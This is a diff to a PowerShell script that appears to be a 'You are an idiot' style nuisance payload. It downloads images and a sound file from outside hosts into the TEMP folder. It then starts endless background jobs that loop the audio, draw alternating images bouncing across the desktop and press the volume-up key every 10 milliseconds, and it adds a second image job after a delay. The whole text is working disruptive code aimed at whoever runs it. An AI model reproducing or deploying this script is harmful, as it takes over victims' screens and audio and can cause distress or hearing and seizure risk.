@@ -31,8 +31,8 @@ if ($hide -eq 1){
 }
 
 # Download sounds and images
-iwr -Uri 'https://i.ibb.co/gDVfZ0L/white.jpg' -OutFile "$env:TEMP\white.jpg"
-iwr -Uri 'https://i.ibb.co/0nxjGzH/black.jpg' -OutFile "$env:TEMP\black.jpg"
+iwr -Uri 'https://i.ibb.co/RpFpd34/wh.png' -OutFile "$env:TEMP\white.png"
+iwr -Uri 'https://i.ibb.co/Nx16b06/bl.png' -OutFile "$env:TEMP\black.png" 
 iwr -Uri 'https://github.com/beigeworm/assets/raw/main/idiot.wav' -OutFile "$env:TEMP\sound.wav"
 sleep 1
 
@@ -47,37 +47,57 @@ $job1 = {
 }
 
 # Loop images
-$job2 = {
+$job2 = {  
     Add-Type -AssemblyName System.Drawing
     Add-Type -AssemblyName System.Windows.Forms
-    $image1 = [System.Drawing.Image]::FromFile("$env:TEMP\white.jpg")
-    $image2 = [System.Drawing.Image]::FromFile("$env:TEMP\black.jpg")
+    $image1 = [System.Drawing.Image]::FromFile("$env:TEMP\white.png")
+    $image2 = [System.Drawing.Image]::FromFile("$env:TEMP\black.png")
     $screen = [System.Windows.Forms.Screen]::PrimaryScreen
     $Width = $screen.Bounds.Width
     $Height = $screen.Bounds.Height
     $desktopHandle = [System.IntPtr]::Zero
     $graphics = [System.Drawing.Graphics]::FromHwnd($desktopHandle)
-
-    while ($true){
-        $graphics.DrawImage($image1, 0, 0, $Width, $Height)
-        $graphics.DrawImage($image2, 0, 0, $Width, $Height)
+    $random = New-Object System.Random
+    $x = 0
+    $y = 200
+    $dx = 15
+    $dy = $random.Next(10, 25)
+    $imageSize = 400
+    $i = 1
+    
+    while ($true) { 
+        if ($i -eq 1){
+            $graphics.DrawImage($image1, $x, $y, $imageSize, $imageSize)
+            $i = 0    
+        }
+        else{
+            $graphics.DrawImage($image2, $x, $y, $imageSize, $imageSize)
+            $i = 1
+        }
+        $x += $dx
+        $y += $dy 
+        if ($x + $imageSize -gt $Width -or $x -lt 0) {
+            $dx = -$dx
+        }
+        if ($y + $imageSize -gt $Height -or $y -lt 0) {
+            $dy = -$dy
+        }
     }
-
 }
 
 # Volume up repeatedly
 $job3 = {
-
     $wshell = New-Object -ComObject wscript.shell
     while ($true){
         $wshell.SendKeys([char]175)
         sleep -m 10
     }
-
 }
 
 # Start jobs
 Start-Job -ScriptBlock $job1
 Start-Job -ScriptBlock $job2
 Start-Job -ScriptBlock $job3
+sleep 17
+Start-Job -ScriptBlock $job2
 pause
